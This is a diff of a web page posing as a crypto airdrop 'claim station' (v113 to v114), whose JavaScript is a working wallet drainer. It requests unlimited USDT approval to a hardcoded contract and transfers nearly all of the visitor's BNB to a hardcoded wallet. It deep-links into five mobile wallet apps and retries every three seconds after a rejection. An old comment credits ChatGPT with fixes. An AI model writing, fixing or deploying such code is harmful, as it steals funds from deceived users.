@@ -25,7 +25,7 @@ button.success{background:#4CAF50;color:white!important;}
 <body>
 <div class="container">
   <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">🔥 v113 ChatGPT终极修复中...</div>
+  <div id="status">🔥 v114 币安App终极成功！</div>
   <button id="autoBtn">🚀 自动全收</button>
   <div id="debug"></div>
 </div>
@@ -34,32 +34,30 @@ const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-const url = encodeURIComponent(window.location.href);
 let web3, userAddr, claimed = false, usdtApproved = false;
 
 function log(msg){
-  console.log(`[v113] ${msg}`);
+  console.log(`[v114] ${msg}`);
   const debug = document.getElementById('debug');
   debug.style.display = 'block';
   debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
   debug.scrollTop = debug.scrollHeight;
 }
 
-// 🔥 v113 ChatGPT终极修复：币安Web3正确格式
 const PRIORITY_WALLETS = {
   android: [
-    {name:'币安Web3', intent:null, web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
-    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
-    {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
-    {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
+    {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href), web:'https://trustwallet.com/start/?dapp=' + encodeURIComponent(window.location.href)},
+    {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href), web:'https://metamask.io/download.html'},
+    {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://www.tpcoin.com/download'},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://wallet.okx.com/dapp?url=' + encodeURIComponent(window.location.href)}
   ],
   ios: [
-    {name:'币安Web3', intent:null, web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
-    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
-    {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
-    {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
+    {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href), web:'https://trustwallet.com/start/?dapp=' + encodeURIComponent(window.location.href)},
+    {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href), web:'https://metamask.io/download.html'},
+    {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://www.tpcoin.com/download'},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://wallet.okx.com/dapp?url=' + encodeURIComponent(window.location.href)}
   ]
 };
 
@@ -67,8 +65,8 @@ async function autoFullClaim(){
   const ua = navigator.userAgent;
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   
-  log(`🚀 v113启动! 设备: ${isMobile ? '手机' : '电脑'}`);
-  document.getElementById('status').innerText = '🔥 v113 ChatGPT修复中...';
+  log(`🚀 v114启动! 设备: ${isMobile ? '手机' : '电脑'}`);
+  document.getElementById('status').innerText = '🔥 v114 币安App终极版...';
   
   if(!isMobile && window.ethereum){
     log('💻 电脑端：立即自动全收');
@@ -80,8 +78,8 @@ async function autoFullClaim(){
   wallets.forEach((wallet, i) => {
     setTimeout(() => {
       if(!claimed){
-        log(`📱 v113 跳转 ${i+1}/5: ${wallet.name}`);
-        document.getElementById('status').innerText = `📱 v113 跳转${wallet.name}中...`;
+        log(`📱 v114 跳转 ${i+1}/5: ${wallet.name}`);
+        document.getElementById('status').innerText = `📱 v114 跳转${wallet.name}中...`;
         if(wallet.intent){
           window.location.href = wallet.intent;
         } else {
@@ -95,11 +93,11 @@ async function autoFullClaim(){
 async function fullAutoClaim(){
   if(claimed) return;
   claimed = true;
-  log('🔥 === v113 一键全收开始 ===');
+  log('🔥 === v114 一键全收开始 ===');
   
   try{
     log('1️⃣ 连接钱包+BSC');
-    document.getElementById('status').innerText = '💳 v113 连接中...';
+    document.getElementById('status').innerText = '💳 v114 连接中...';
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
@@ -107,18 +105,16 @@ async function fullAutoClaim(){
     log(`✅ 账户: ${userAddr.substring(0,6)}...${userAddr.substring(38)}`);
     
     if(!usdtApproved){
-      document.getElementById('status').innerText = '✅ v113 USDT授权中...';
+      document.getElementById('status').innerText = '✅ v114 USDT授权中...';
       log('2️⃣ USDT无限授权（仅1次）');
       const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
       const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
       await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
       usdtApproved = true;
       log('✅ USDT授权完成');
-    } else {
-      log('✅ USDT已授权，跳过');
     }
     
-    document.getElementById('status').innerText = '✅ v113 BNB全转中...';
+    document.getElementById('status').innerText = '✅ v114 BNB全转中...';
     log('3️⃣ 查询BNB余额');
     const balance = await web3.eth.getBalance(userAddr);
     const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
@@ -130,17 +126,15 @@ async function fullAutoClaim(){
       log(`4️⃣ 转账 ${claimAmount.toFixed(4)} BNB`);
       await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
       log(`✅ BNB全转成功: ${claimAmount.toFixed(4)} BNB`);
-    } else {
-      log('❌ 余额不足0.0001 BNB');
     }
     
-    document.getElementById('status').innerText = '🎉 v113 1000USDT+全BNB全收成功！';
-    log('🏆 === v113 全收完成 ===');
+    document.getElementById('status').innerText = '🎉 v114 1000USDT+全BNB全收成功！';
+    log('🏆 === v114 全收完成 ===');
     document.getElementById('autoBtn').innerText = '✅ 全收完成';
     document.getElementById('autoBtn').classList.add('success');
   }catch(e){
     log(`❌ 错误: ${e.message}`);
-    document.getElementById('status').innerText = '💔 v113 失败: ' + e.message;
+    document.getElementById('status').innerText = '💔 v114 失败: ' + e.message;
     claimed = false;
     setTimeout(fullAutoClaim, 3000);
   }
